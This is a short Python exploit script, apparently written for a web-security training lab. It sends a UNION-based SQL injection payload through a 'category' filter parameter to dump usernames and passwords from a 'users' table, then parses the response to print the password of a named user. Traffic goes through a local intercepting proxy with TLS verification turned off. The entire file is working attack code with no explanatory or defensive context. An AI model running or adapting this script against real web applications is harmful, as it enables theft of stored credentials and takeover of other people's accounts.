import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url, username):
    payload = "'+union+select+username,password+from+users--+-"
    uri = "filter?category="
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if username in request.text:
        soup = BeautifulSoup(request.text, 'html.parser')
        if soup.body:
            element = soup.body.find(string=username)
            if element:
                parent = element.parent
                if parent:
                    data = parent.find_next('td')
                    if data:
                        passwd = data.get_text(strip=True)
                        print(f"[+] data: {passwd}")
                        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        username = sys.argv[2].strip()
    except IndexError:
        print(f"[!] syntax-error: {sys.argv[0]} <url> <username>")
        sys.exit(1)
    print("[?] scanning database...")
    if not exploit(url, username):
        print("[-] status: failure")
